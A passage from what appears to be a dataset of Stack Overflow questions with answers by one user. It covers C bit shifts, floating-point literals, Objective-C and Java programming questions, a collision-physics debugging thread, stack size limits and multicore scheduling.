<pre><code>uint64_t lshift(uint64_t x, int r)
{
  return x &lt;&lt; r;
}

_lshift:
    movl    12(%esp), %ecx
    movl    4(%esp), %eax
    movl    8(%esp), %edx
    shldl   %cl,%eax, %edx
    sall    %cl, %eax
    testb   $32, %cl
    je      L5
    movl    %eax, %edx
    xorl    %eax, %eax
L5:
    ret
</code></pre>

<p>Now, I'm not very familiar with C#, but I'm guessing it has a similar philosophy -- design the language to allow it to be implemented as efficiently as possible.  By specifying that shift operations only use the bottom 5/6 bits of the shift count, it permits the JIT compiler to compile the shifts as optimally as possible.  32-bit shifts, as well as 64-bit shifts on 64-bit systems, can get JIT compiled into a single opcode.</p>

<p>If C# were ported to a platform that had different behavior for its native shift opcodes, then this would actually incur an extra performance hit -- the JIT compiler would have to ensure that the standard is respected, so it would have to add extra logic to make sure only the bottom 5/6 bits of the shift count were used.</p>
"
"<p>Can increment of a register (in a loop) be used to determine the (effective) clock rate?
I've naturally assumed it can, but I was commented that Cpu's may implant Super-scalar techniques that make this kind of computation useless. 
Also I was told that incrementing of registers on CPU can be done in less than one clock cycle.</p>

<p>is it true?</p>
","9530","Adam Rosenfield","<p>No, not reliably.  The number of cycles that it takes to increment a register can vary between different types of processors, and you also have to include the overhead of looping.  In any modern operating system, you're going to have to deal with preemptive multitasking, so you have no idea how much CPU time the process scheduler is going to give you.  Depending on how much work other processes are doing, you may get a lot or a little CPU time, so the number of register increments you can perform per second is highly variable.</p>

<p>Furthermore, in a multicore environment, the clocks may not tick at the same rate.  If your process gets moved between cores by the scheduler for some reason or another, your clock rate could change unpredictably.</p>

<p>There are much better ways of getting the clock rate, such as asking the operating system for it (of course, how to do this varies with OS).</p>
"
"<p>In a C program, when you write a floating point literal like 3.14159 is there standard interpretation or is it compiler or architecture dependent?  Java is <a href=""http://java.sun.com/j2se/1.4.2/docs/api/java/lang/Double.html#valueOf%28java.lang.String%29"" rel=""nofollow"">exceedingly clear</a> about how floating point strings are interpreted, but when I read K&amp;R or other C documentation the issue seems swept under the rug.</p>
","9530","Adam Rosenfield","<p>From the C99 standard, section 6.4.4.2 Floating constants, paragraph 3 (emphasis mine):</p>

<blockquote>
  <p>The significand part is interpreted as a (decimal or hexadecimal) rational number; the 
  digit sequence in the exponent part is interpreted as a decimal integer. For decimal 
  floating constants, the exponent indicates the power of 10 by which the significand part is 
  to be scaled. For hexadecimal floating constants, the exponent indicates the power of 2 
  by which the significand part is to be scaled. For decimal floating constants, and also for 
  hexadecimal floating constants when <code>FLT_RADIX</code> is not a power of 2, <strong>the result is either 
  the nearest representable value, or the larger or smaller representable value immediately 
  adjacent to the nearest representable value, chosen in an implementation-defined manner</strong>. 
  For hexadecimal floating constants when <code>FLT_RADIX</code> is a power of 2, the result is 
  correctly rounded.</p>
</blockquote>

<p>So, you're going to get a constant within one <a href=""http://en.wikipedia.org/wiki/Unit%5Fin%5Fthe%5Flast%5Fplace"" rel=""nofollow"">ULP</a> in an implementation-defined manner.  Recall that <em>implementation-defined</em> means that the implementation (in this case, the C runtime) can choose any of the options, but that choice <strong>must be documented</strong>.  So, you can consult libc runtime documentation to find out how the rounding occurs.</p>
"
"<p>Consider a binary tree:</p>

<ol>
<li><em>n</em> is a node, if <em>n</em> is an integer</li>
<li>(+ <em>a</em> <em>b</em>) is a node, if <em>a</em> and <em>b</em> are nodes.</li>
</ol>

<p>We have the following three operations:</p>

<ol>
<li>(+ <em>a</em> <em>b</em>) -> (+ <em>b</em> <em>a</em>)</li>
<li>(+ (+ <em>a</em> <em>b</em>) <em>c</em>) -> (+ <em>a</em> (+ <em>b</em> <em>c</em>))</li>
<li>(+ <em>a</em> (+ <em>b</em> <em>c</em>)) -> (+ (+ <em>a</em> <em>b</em>) <em>c</em>) <em>-- (2. in reverse)</em></li>
</ol>

<p>I need an algorithm for giving all the possible permutations of a given tree using these operations. Any operation maybe applied to any subtree. With a permutation I mean any tree that has the exact same set of leaves. It's probably not very difficult, but I just can't seem to figure it out.</p>

<p>[Edit] The leaves can also be names (i.e. variables), so relying on their properties as integers is not an option. The trees do represent sums.</p>

<p>[Edit2] The point of this excercise is to reduce a sum by finding terms of the form <em>A</em> and <em>-A</em>, swizzling the tree to get them into a subtree (+ <em>A</em> <em>-A</em>) in order to eliminate them. The three operations above are axioms in my system and they need to be used all the way, otherwise it's not possible to prove that the reduced tree is equal to the original. Since I'm using <a href=""http://twelf.plparty.org/wiki/Main%5FPage"" rel=""nofollow"">Twelf</a> logic programming language, if I can figure out an algorithm to do what I originally asked, the rest follows easily, but alternative solutions are of course welcome.</p>
","9530","Adam Rosenfield","<p>The solution to this problem is undoubtably going to include <a href=""http://en.wikipedia.org/wiki/Catalan%5Fnumber#Applications%5Fin%5Fcombinatorics"" rel=""nofollow"">Catalan numbers</a>.  There are <em>C</em><sub><em>n</em>-1</sub> possible binary trees with <em>n</em> leaves, and there are <em>n</em>! possible orderings of the leaves, so there are <em>n</em>! * <em>C</em><sub><em>n</em>-1</sub> possible trees.  Enumerating them is slightly trickier, though.</p>
"
"<p>Since I started learning Objective C and Cocoa, I've been wondering why they have chosen the extension .m for the implementation files - was it supposed to mean something, or was it just a random letter? Does anyone know? I couldn't find such information anywhere on Google...</p>
","9530","Adam Rosenfield","<p>It stands for ""methods"".  From the <a href=""http://thaesofereode.info/clocFAQ/#tools-files"" rel=""nofollow"">comp.lang.objective-C FAQ</a>:</p>

<blockquote>
  <p>The organisation of Objective-C source is typically similar to that of C or C++ source code, with declarations and object interfaces going into <em>header</em> files named with a .h extension, and definitions and object implementations going in files named with a .m (short for <em>methods</em>) extension.</p>
</blockquote>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/1524604/md5-algorithm-in-objective-c"">MD5 algorithm in Objective C</a>  </p>
</blockquote>



<p>I need to hash a string using the MD5 technique in cocoa.  Any frameworks that are used must be able to be accessed on the iphone.  please provide code if possible.</p>
","9530","Adam Rosenfield","<p>MD5 is not encryption, it is a <a href=""http://en.wikipedia.org/wiki/Cryptographic%5Fhash%5Ffunction"" rel=""nofollow"">cryptographic hash function</a>.  It's a one-way function whose output is a 128-bit number.  The fact that it is <em>cryptographic</em> means that it is a computationally hard problem that, given an MD5 hash output, compute a string whose MD5 is that value.  So, MD5 can be used for data integrity checks, but not for encryption.</p>
"
"<p>I am trying to figure out how to convert an NSInteger, say 56, to an NSString that is a binary representation of the original (int) value. Perhaps someone knows a formatting technique that can accept 56 and return ""111000"" within Objective C. Thanks All.</p>
","9530","Adam Rosenfield","<p>There's no built-in formatting operator to do that.  If you wanted to convert it to a hexadecimal string, you could do:</p>

<pre><code>NSString *str = [NSString stringWithFormat:""%x"", theNumber];
</code></pre>

<p>To convert it to a binary string, you'll have to build it yourself:</p>

<pre><code>NSMutableString *str = [NSMutableString stringWithFormat:@""""];
for(NSInteger numberCopy = theNumber; numberCopy &gt; 0; numberCopy &gt;&gt;= 1)
{
    // Prepend ""0"" or ""1"", depending on the bit
    [str insertString:((numberCopy &amp; 1) ? @""1"" : @""0"") atIndex:0];
}
</code></pre>
"
"<p>I am trying to convert a string encoded in java in UTF-8 to ISO-8859-1. Say for example, in the string 'âabcd'  'â' is represented in ISO-8859-1 as E2. In UTF-8 it is represented as two bytes. C3 A2 I believe. When I do a getbytes(encoding) and then create a new string with the bytes in ISO-8859-1 encoding, I get a two different chars. Ã¢.  Is there any other way to do this so as to keep the character the same i.e. âabcd?</p>
","9530","Adam Rosenfield","<p>If you're dealing with character encodings other than UTF-16, you shouldn't be using <code>java.lang.String</code> or the <code>char</code> primitive -- you should only be using <code>byte[]</code> arrays or <code>ByteBuffer</code> objects.  Then, you can use <a href=""http://java.sun.com/javase/6/docs/api/java/nio/charset/Charset.html""><code>java.nio.charset.Charset</code></a> to convert between encodings:</p>

<pre><code>Charset utf8charset = Charset.forName(""UTF-8"");
Charset iso88591charset = Charset.forName(""ISO-8859-1"");

ByteBuffer inputBuffer = ByteBuffer.wrap(new byte[]{(byte)0xC3, (byte)0xA2});

// decode UTF-8
CharBuffer data = utf8charset.decode(inputBuffer);

// encode ISO-8559-1
ByteBuffer outputBuffer = iso88591charset.encode(data);
byte[] outputData = outputBuffer.array();
</code></pre>
"
"<p>I have a set of balloons that I am trying to get to bounce off of each other like balls.  When I start to move them and then detect collision, the routine for the collisions eventually returns a NAN for the velocity of the balloons.  I end up with a position of something like x=270, y= -nan(0x400000).  I've been looking at the code all day and I still can't find the error, any help would be appreciated.  Here's the code:</p>

<pre><code>- (void)MoveBalloons {

for (CurBalloon=1; CurBalloon &lt;= NumBalloons; ++CurBalloon) {

//check for edge hCurBalloont
if (uBalloon[CurBalloon].pos.y &gt; 456) {
	uBalloon[CurBalloon].pos.y = 456;
	uBalloon[CurBalloon].Vel_y = -uBalloon[CurBalloon].Vel_y;
}
if (uBalloon[CurBalloon].pos.y &lt; 24) {
	uBalloon[CurBalloon].pos.y = 24;
	uBalloon[CurBalloon].Vel_y = -uBalloon[CurBalloon].Vel_y;
}
if (uBalloon[CurBalloon].pos.x &gt; 289) {
	uBalloon[CurBalloon].pos.x = 289;
	uBalloon[CurBalloon].Vel_x = -uBalloon[CurBalloon].Vel_x;
}
if (uBalloon[CurBalloon].pos.x &lt; 31) {
	uBalloon[CurBalloon].pos.x = 31;
	uBalloon[CurBalloon].Vel_x = -uBalloon[CurBalloon].Vel_x;
}

//call loop to go through the balloons for each touch.
//[self CollisionCheck];

	NSUInteger h;
	float dist, tempvelx, tempvely, temp2velx, temp2vely;;

	for (h=1; h &lt;= NumBalloons; ++h) {
		//check if balloon is too close
		if (CurBalloon == h) { //skip the check ifit's the same balloon
		} else {
			dist = distanceBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos);
			if (dist &lt;= (kBalloonNear)) { //balloon's touching

				tempvelx = uBalloon[CurBalloon].Vel_x;
				tempvely = uBalloon[CurBalloon].Vel_y;
				temp2velx = uBalloon[h].Vel_x;
				temp2vely = uBalloon[h].Vel_y;

				tempvelx = (uBalloon[CurBalloon].Vel_x - uBalloon[h].Vel_x) * (sinf(angleBetweenPoints(uBalloon[CurBalloon].pos,uBalloon[h].pos)))*(uBalloon[CurBalloon].Vel_x - uBalloon[h].Vel_x) * (sinf(angleBetweenPoints(uBalloon[CurBalloon].pos,uBalloon[h].pos))) - (uBalloon[CurBalloon].Vel_y - uBalloon[h].Vel_y) * sinf(angleBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos)) * cosf(angleBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos)) + uBalloon[h].Vel_x;

				tempvely = (uBalloon[CurBalloon].Vel_y - uBalloon[h].Vel_y) * (cosf(angleBetweenPoints(uBalloon[CurBalloon].pos,uBalloon[h].pos))) * (uBalloon[CurBalloon].Vel_y - uBalloon[h].Vel_y) * (cosf(angleBetweenPoints(uBalloon[CurBalloon].pos,uBalloon[h].pos))) - (uBalloon[CurBalloon].Vel_x - uBalloon[h].Vel_x) * sinf(angleBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos)) * cosf(angleBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos)) + uBalloon[h].Vel_y;

				temp2velx = (uBalloon[CurBalloon].Vel_x - uBalloon[h].Vel_x) * (cosf(angleBetweenPoints(uBalloon[CurBalloon].pos,uBalloon[h].pos))) * (uBalloon[CurBalloon].Vel_x - uBalloon[h].Vel_x) * (cosf(angleBetweenPoints(uBalloon[CurBalloon].pos,uBalloon[h].pos))) + (uBalloon[CurBalloon].Vel_y - uBalloon[h].Vel_y) * sinf(angleBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos)) * cosf(angleBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos)) + uBalloon[h].Vel_x;

				temp2vely = (uBalloon[CurBalloon].Vel_y - uBalloon[h].Vel_y) * (sinf(angleBetweenPoints(uBalloon[CurBalloon].pos,uBalloon[h].pos)))*(uBalloon[CurBalloon].Vel_y - uBalloon[h].Vel_y) * (sinf(angleBetweenPoints(uBalloon[CurBalloon].pos,uBalloon[h].pos))) - (uBalloon[CurBalloon].Vel_x - uBalloon[h].Vel_x) * sinf(angleBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos)) * cosf(angleBetweenPoints(uBalloon[CurBalloon].pos, uBalloon[h].pos)) + uBalloon[h].Vel_y;

				uBalloon[CurBalloon].Vel_x = tempvelx;  
				uBalloon[CurBalloon].Vel_y = tempvely;
				uBalloon[h].Vel_x = temp2velx;  //set to old value of CurBalloon balloon.
				uBalloon[h].Vel_y = temp2vely;

			}
		}
	}


if (fabsf(uBalloon[CurBalloon].Vel_x) &gt;= kBalloonMaxSpeed) uBalloon[CurBalloon].Vel_x = kBalloonMaxSpeed;
if (fabsf(uBalloon[CurBalloon].Vel_y) &gt;= kBalloonMaxSpeed) uBalloon[CurBalloon].Vel_y = kBalloonMaxSpeed;
if (fabsf(uBalloon[CurBalloon].Vel_x) &lt;= -kBalloonMaxSpeed) uBalloon[CurBalloon].Vel_x = -kBalloonMaxSpeed;
if (fabsf(uBalloon[CurBalloon].Vel_y) &lt;= -kBalloonMaxSpeed) uBalloon[CurBalloon].Vel_y = -kBalloonMaxSpeed;



if (uBalloon[CurBalloon].Vel_y &gt; KBalloonSpeed) { //if travellCurBalloonng fast, slow CurBalloont up fast to normal speed
	uBalloon[CurBalloon].Vel_y = uBalloon[CurBalloon].Vel_y - kBalloonSlowRate;
}
if (uBalloon[CurBalloon].Vel_x &gt; KBalloonSpeed) { //if travellCurBalloonng fast, slow CurBalloont up fast to normal speed
	uBalloon[CurBalloon].Vel_x = uBalloon[CurBalloon].Vel_x - kBalloonSlowRate;
}
if (uBalloon[CurBalloon].Vel_y &lt; KBalloonSpeed) { //if travellCurBalloonng fast, slow CurBalloont up fast to normal speed
	uBalloon[CurBalloon].Vel_y = uBalloon[CurBalloon].Vel_y + kBalloonSlowRate;
}
if (uBalloon[CurBalloon].Vel_x &lt; KBalloonSpeed) { //if travellCurBalloonng fast, slow CurBalloont up fast to normal speed
	uBalloon[CurBalloon].Vel_x = uBalloon[CurBalloon].Vel_x + kBalloonSlowRate;
}


//slow to 0 if velocCurBalloonty CurBalloons CurBalloonnsCurBalloonde the slow rate
if (fabsf(uBalloon[CurBalloon].Vel_x) &lt;= kBalloonSlowRate) uBalloon[CurBalloon].Vel_x = 0;
if (fabsf(uBalloon[CurBalloon].Vel_y) &lt;= kBalloonSlowRate) uBalloon[CurBalloon].Vel_y = 0;

uBalloon[CurBalloon].Vel_x = uBalloon[CurBalloon].Vel_x - kBalloonFallRate; //keep movCurBalloonng down		

//add velocCurBalloonty to poCurBalloonnts
uBalloon[CurBalloon].pos.y= uBalloon[CurBalloon].pos.y + uBalloon[CurBalloon].Vel_y;	
uBalloon[CurBalloon].pos.x = uBalloon[CurBalloon].pos.x + uBalloon[CurBalloon].Vel_x;

}
</code></pre>

<p>}</p>

<p>Here's the functions written in c that are used for distance and the angle.  I'm even making sure to never have a sqrt(-1) and division by 0:  </p>

<pre><code>CGFloat distanceBetweenPoints (CGPoint first, CGPoint second) {
CGFloat deltaX = second.x - first.x;
CGFloat deltaY = second.y - first.y;
if ((deltaX*deltaX + deltaY*deltaY ) == -1) {
	return sqrtf(-.99);
} else {
return sqrtf(deltaX*deltaX + deltaY*deltaY );
}
</code></pre>

<p>}</p>

<pre><code>CGFloat angleBetweenPoints(CGPoint first, CGPoint second) {

if (first.x - second.x == 0)  {
	return (pi / 2);
} else {
	return atanf((first.y-second.y) / (first.x - second.x));
}
</code></pre>

<p>}</p>
","9530","Adam Rosenfield","<p>This probably isn't the source of your error, but this function isn't quite right:</p>

<pre><code>CGFloat angleBetweenPoints(CGPoint first, CGPoint second) {

if (first.x - second.x == 0)  {
        return (pi / 2);
} else {
        return atanf((first.y-second.y) / (first.x - second.x));
}
</code></pre>

<p>This will always return an angle between -pi/2 and +pi/2, and it may return an incorrect result if <code>first.x - second.x</code> is very small and close to 0, but not exactly 0.  Instead, just use <a href=""http://linux.die.net/man/3/atan2"" rel=""nofollow"">atan2</a>:</p>

<pre><code>CGFloat angleBetweenPoints(CGPoint first, CGPoint second) {
    return atan2f(first.y - second.y, first.x - second.x);
}
</code></pre>

<p><code>atan2()</code> returns the full range of angles from -pi to +pi, and handles the edge cases appropriately.  This probably won't affect you since you're just taking the sin/cos of the resulting angle.  You're doing so in a very inefficient manner, however -- you're calling <code>angleBetweenPoints()</code> 8 (!) times when the result is the same very time, and taking 4 <code>sin()</code>s and 4 <code>cos()</code>s.  You could skip all of the trigonometry and just use the geometry of similar triangles to get the same results.</p>
"
"<p>I have this code in my main file:</p>

<pre><code>int grid[] = { 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 ,
               1 , 2 , 3 , 2 , 3 , 2 , 3 , 1 , 
               1 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 
               1 , 0 , 1 , 0 , 1 , 0 , 1 , 1 , 
               1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 
               1 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 
               1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 };
</code></pre>

<p>How do I define it in my header so that I can access the variable throughout my class?</p>
","9530","Adam Rosenfield","<p>You can't define it in your header.  You have to <em>declare</em> it in your header and <em>define</em> it in a source (<code>.m</code>) file:</p>

<pre><code>// In MyClass.h
extern int grid[];

// In MyClass.m
int grid[] = {...};
</code></pre>
"
"<pre><code>NSNumber* n = [[NSNumber alloc] initWithInt:100];
NSNumber* n1 = n;
</code></pre>

<p>In the code above, why is the value of n's retainCount set to 2? In the second line of the code, I didn't use retain to increase the number of retainCount.</p>

<hr>

<p>I found a strange situation. Actually the retainCount depends on the initial number:</p>

<pre><code>NSNumber *n = [[NSNumber alloc] initWithInt:100]; 
// n has a retainCount of 1

NSNumber *n2 = [[NSNumber alloc] initWithInt:11]; 
// n has a retainCount of 2
</code></pre>
","9530","Adam Rosenfield","<p>You should <strong>never</strong> rely on the <code>retainCount</code> of an object.  You should <strong>only</strong> use it as a debugging aid, never for normal control flow.</p>

<p>Why?  Because it doesn't take into account <code>autorelease</code>s.  If an object is <code>retain</code>ed and subequently <code>autorelease</code>d, its <code>retainCount</code> will increment, but as far as you're concerned, its <em>real</em> retain count hasn't been changed.  The only way to get an object's real retain count is to also count how many times it's been added to any of the autorelease pools in the autorelease pool chain, and trying to do so is asking for trouble.</p>

<p>In this case, the <code>retainCount</code> is 2 because somewhere inside <code>alloc</code> or <code>initWithInt:</code>, the object is being <code>retain</code>ed and <code>autorelease</code>d.  But you shouldn't need to know or care about that, it's an implementation detail.</p>
"
"<p>What is the best way to kill a critical process?</p>
","9530","Adam Rosenfield","<p><a href=""http://support.microsoft.com/kb/131065"" rel=""nofollow"">This knowledge base article</a> describes how to do it.  You first call <code>SeDebugPrivilege()</code> to obtain the privileges to terminate processes, then you call <a href=""http://msdn.microsoft.com/en-us/library/ms684320%28VS.85%29.aspx"" rel=""nofollow""><code>OpenProcess()</code></a> with the <code>PROCESS_TERMINATE</code> flag to get a handle to the process you wish to terminate, and then finally you call <a href=""http://msdn.microsoft.com/en-us/library/ms686714%28VS.85%29.aspx"" rel=""nofollow""><code>TerminateProcess()</code></a> to terminate the process.</p>
"
"<p>There is probably a very simple solution for this but I can't get it working.</p>

<p>I have got multiple classes in my Cocoa file. In one of the classes <code>class1</code> I create a variable that I need to use in another class <code>class2</code> as well. Is there a simple way to import this variable in <code>class2</code>?</p>
","9530","Adam Rosenfield","<p>You can either make the variable public, or make it into a property.  For example, to make it public:</p>

<pre><code>@interface Class1
{
@public
    int var;
}
// methods...
@end

// Inside a Class2 method:
Class1 *obj = ...;
obj-&gt;var = 3;
</code></pre>

<p>To make it a property:</p>

<pre><code>@interface Class1
{
    int var;  // @protected by default
}
@property (readwrite, nonatomic) int var;
// methods...
@end

@implementation Class1
@synthesize var;
...
@end

// Inside a Class2 method:
Class1 *obj = ...;
obj.var = 3;  // implicitly calls [obj setVar:3]
int x = obj.var;  // implicitly calls x = [obj var];
</code></pre>
"
"<p>When I run the following pixel bender code:</p>

<pre><code>input image4 src;
output float4 dst;

// How close of a match you want
parameter float threshold
&lt;
  minValue:     0.0;
  maxValue:     1.0;
  defaultValue: 0.4;
&gt;;

// Color you are matching against.
parameter float3 color
&lt;
  defaultValue: float3(1.0, 1.0, 1.0);
&gt;;

void evaluatePixel()
{
  float4 current = sampleNearest(src, outCoord());
  dst = float4((distance(current.rgb, color) &lt; threshold) ? 0.0 : current);
}
</code></pre>

<p>I got the following error message:</p>

<p>ERROR: (line 21): ':' : wrong operand types no operation ':' exists that takes a left-hand operand of type 'const float' and a right operand of type '4-component vector of float' (or there is no acceptable conversion)</p>

<p>Please advice</p>
","9530","Adam Rosenfield","<p>I'm not familiar with Pixel Bender, but I'm guessing the problem is that the last two arguments of the ternary <code>?:</code> operator must be the same type:</p>

<pre><code>A = condition ? B : C
</code></pre>

<p><code>B</code> and <code>C</code> must have the same type, which must be the same type as <code>A</code>.  In this case, it looks like you're trying to make <code>float4</code>s, so you should do:</p>

<pre><code>dst = (distance(current.rgb, color) &lt; threshold) ? float4(0.0) : current;
</code></pre>

<p>So that both of the last arguments (<code>float4(0.0)</code> and <code>current</code>) have type <code>float4</code>.</p>
"
"<p>I need to transform bitmap images with their 4 corner points moved from one location to another.</p>

<p>Any code that can run on Windows, C#/VB.NET preferably, even help how to use scriptable programs like <a href=""http://www.getpaint.net/index.html"" rel=""nofollow"">Paint.NET</a> or <a href=""http://www.adobe.com/products/photoshop/"" rel=""nofollow"">Photoshop</a> would be accepted. The Java Advanced Imaging API sounds hopeful.</p>

<p>I need it for a screenshot manipulation system, which allows you to get such effects:</p>

<p><img src=""http://www.wholetomato.com/images/tour/mondoPerspectiveTrans.gif"" alt=""alt text"" /></p>
","9530","Adam Rosenfield","<p>The keyword here is <a href=""http://en.wikipedia.org/wiki/Homography"" rel=""nofollow""><em>homography</em></a>.  Manolis Lourakis has written a GPL'ed homography implementation in C that is available <a href=""http://www.ics.forth.gr/~lourakis/homest/"" rel=""nofollow"">here</a>; however, this will not be able to be ported very easily because it relies on some external libraries such as <a href=""http://www.netlib.org/lapack/"" rel=""nofollow"">LAPACK</a>.</p>
"
"<p>In a Java program, I have multiple subclasses inheriting from a parent (which is abstract). I wanted to express that every child should have a member that is set once only (which I was planning to do from the constructor). My plan was to code s.th. like this:</p>

<pre><code>public abstract class Parent {
    protected final String birthmark;
}

public class Child extends Parent {
    public Child(String s) {
        this.birthmark = s;
    }
}
</code></pre>

<p>However, this seems to not please the Java gods. In the parent class, I get the message that <code>birthmark</code> ""might not have been initialized"", in the child class I get ""The final field <code>birthmark</code> cannot be accessed"".</p>

<p>So what's the Java way for this? What am I missing?</p>
","9530","Adam Rosenfield","<p>You can't do it because while comparing the parent class, the compiler can't be sure that the subclass will initialize it.  You'll have to initialize it in the parent's constructor, and have the child call the parent's constructor:</p>

<pre><code>public abstract class Parent {
    protected final String birthmark;
    protected Parent(String s) {
        birthmark = s;
    }
}

public class Child extends Parent {
    public Child(String s) {
        super(s);
        ...
    }
}
</code></pre>
"
"<p>I wrote a C program in which I did some pretty heavy stack allocation, around 2 MiB. Since I use the poor man's IDE* I was automatically running the program via make in order to test it, each time I compiled.</p>

<p>I had pretty much wrapped everything up, but for some reason, during some of the final optimization, I ran it directly from the shell. Instant segfault! Running it with make still worked, and running it by hand always produced the same segfault.</p>

<p>I eventually reduced the amount of stack allocation I was doing to 256 KiB, which solved the problem. My rational was that make was probably exec-ing the process, and thus it was inheriting some weird parameters that allowed it to use more stack space.</p>

<p>Although everything is fine now, I have no way of testing my theory. Can anyone confirm or deny, or suggest some way of testing?</p>

<p>* zsh, vim, gcc, gdb, and some nutty makefiles</p>
","9530","Adam Rosenfield","<p>You can try setting the maximum stack size with <a href=""http://linux.die.net/man/1/ulimit"" rel=""nofollow"">ulimit(1)</a> and see if it works:</p>

<pre><code># Limit stack to 1024 KiB
ulimit -s 1024; ./myprogram
# Now no limit
ulimit -s unlimited; ./myprogram
</code></pre>
"
"<p>I can understand how one can write a program that uses multiple processes or threads: fork() a new process and use IPC, or create multiple threads and use those sorts of communication mechanisms.</p>

<p>I also understand context switching. That is, with only once CPU, the operating system schedules time for each process (and there are tons of scheduling algorithms out there) and thereby we achieve running multiple processes simultaneously.</p>

<p>And now that we have multi-core processors (or multi-processor computers), we could have two processes running simultaneously on two separate cores.</p>

<p>My question is about the last scenario: how does the kernel control which core a process runs on? Which system calls (in Linux, or even Windows) schedule a process on a specific core?</p>

<p>The reason I'm asking: I'm working on a project for school where we are to explore a recent topic in computing - and I chose multi-core architectures. There seems to be a lot of material on how to program in that kind of environment (how to watch for deadlock or race conditions) but not much on controlling the individual cores themselves. I would love to be able to write a few demonstration programs and present some assembly instructions or C code to the effect of ""See, I am running an infinite loop on the 2nd core, look at the spike in CPU utilization for <em>that specific core</em>"".</p>

<p>Any code examples? Or tutorials?</p>

<p>edit: For clarification - many people have said that this is the purpose of the OS, and that one should let the OS take care of this. I completely agree! But then what I'm asking (or trying to get a feel for) is what the operating system actually does to do this. Not the scheduling algorithm, but more ""once a core is chosen, what instructions must be executed to have that core start fetching instructions?""</p>
","9530","Adam Rosenfield","<p>As others have mentioned, it's controlled by the operating system.  Depending on the OS, it may or may not provide you with system calls that allow you to affect what core a given process executes on.  However, you should usually just let the OS do the default behavior.  If you have a 4-core system with 37 processes running, and 34 of those processes are sleeping, it's going to schedule the remaining 3 active processes onto separate cores.</p>

<p>You'll likely only see a speed boost on playing with core affinities in very specialized multithreaded applications.  For example, suppose you have a system with 2 dual-core processors.  Suppose you have an application with 3 threads, and two of threads operate heavily on the same set of data, whereas the third thread uses a different set of data.  In this case, you would benefit the most by having the two threads which interact on the same processor and the third thread on the other processor, since then they can share a cache.  The OS has no idea what memory each thread needs to access, so it may not allocate threads to cores appropriately.</p>

<p>If you're interested in <em>how</em> the operating system, read up on <a href=""http://en.wikipedia.org/wiki/Scheduling%5F%28computing%29"" rel=""nofollow"">scheduling</a>.  The nitty gritty details of multiprocessing on x86 can be found in the <a href=""http://www.intel.com/products/processor/manuals/"" rel=""nofollow"">Intel 64 and IA-32 Architectures Software Developer's Manuals</a>.  Volume 3A, Chapters 7 and 8 contain relevant information, but bear in mind these manuals are extremely technical.</p>
"
"<p>I have an actionsheet popup in my iphone application.  I would like to fill it with strings from an array instead of predetermined values.  </p>

<p>I can't find anything online to do this!  Perhaps actionsheet isn't the right thing to use?</p>

<p>Right now this is what I'm using to build it:</p>

<pre><code>roomspopup = [ [ UIActionSheet alloc ]  
    			  initWithTitle: alertname  
    			  delegate: self 
    			  cancelButtonTitle: @""Cancel"" 
    			  destructiveButtonTitle: nil 
    			  otherButtonTitles: @""Kitchen"", ""Dining Room"", nil ];
</code></pre>

<p>But, instead of ""Kitchen"" and ""Dining Room"" I'd like it to fill in from an array.  The size of the array (i.e. the number of rooms) is not a fixed number.</p>
","9530","Adam Rosenfield","<p>You can't do it in one line.  You'll have to call <code>initWithTitle</code> with an empty set of buttons, and then add your other buttons with loop using <a href=""http://developer.apple.com/iphone/library/documentation/UIKit/Reference/UIActionSheet%5FClass/Reference/Reference.html#//apple%5Fref/occ/instm/UIActionSheet/addButtonWithTitle:""><code>addButtonWithTitle:</code></a>.</p>
"
"<p>What's the uninitialized value in Python, so I can compare if something is initialized, like:</p>

<pre><code>val

if val == undefined ?
</code></pre>

<p>EDIT: added a pseudo keyword.</p>

<p>EDIT2: I think I didn't make it clear, but say val is already there, but nothing is assigned to it.</p>

<h3>Duplicate: <a href=""http://stackoverflow.com/questions/664294/just-declaring-a-variable-in-python"">Just declaring a variable in Python?</a></h3>
","9530","Adam Rosenfield","<p>To add to <a href=""http://stackoverflow.com/questions/664219/uninitialized-value-of-python/664222#664222"">phihag's answer</a>: you can use <a href=""http://docs.python.org/library/functions.html#dir"" rel=""nofollow""><code>dir()</code></a> to get a list of all of the variables in the current scope, so if you want to test if <code>var</code> is in the current scope without using exceptions, you can do:</p>

<pre><code>if 'var' in dir():
    # var is in scope
</code></pre>
"
"<p>Greetings Everyone.</p>

<p>I'm currently writing a multi-language programe in C, C++ and fortran on UNIX, unfortunatly I run into ""Segmentation Error"" when I try and execute after compiling. </p>

<p>I've narrowed down the problem to the interface between the C++ and C sections of my program. The first section consists of main.ccp and SA.cpp, and the second CFE.c. </p>

<p>A class called 'SimAnneal' exsists in SA.cpp, with public vectors DensityArray and ElementArray. The order of the program follows:</p>

<ol>
<li><p>Create SimAnneal Object 'Obj1' and call function ObjFunction()</p></li>
<li><p>That function initializes the vector sizes</p></li>
<li><p>Call CFE(...) with pointers to both vectors and their length.</p></li>
<li><p>CFE.c edits the data elements of the vectors directly via use of the pointers</p></li>
<li><p>ObjFunction() uses EnergyArray (and possible DensityArray) data.</p></li>
</ol>

<p>The relevant script is below for all sources:</p>

<p>main.cpp</p>

<pre><code>#include ""SA.h"" 

int main() 
{   
    SimAnneal Obj1;

    Obj1.ObjFunction();

    return 0;
}
</code></pre>

<p>SA.h</p>

<pre><code>class SimAnneal 
{
    void Initialize ();
    ...
  public
    std::vector&lt;float&gt; DensityArray; 
    std::vector&lt;float&gt; EnergyArray;
    double ObjFunction ();
    ...
}
</code></pre>

<p>SA.cpp</p>

<pre><code>#include ""CFE.h""

void SimAnneal::Initialize ()
{
    int length = 15;
    EnergyArray.resize(length);
DensityArray.resize(length);
}

double SimAnneal::ObjFunction () 
{
    Initialize ();

    CFE(&amp;DensityArray[0], &amp;EnergyArray[0], DensityArray.size()); 

      // sends pointers of both arrays to CFE.c, which will then 
      // directly modify the array

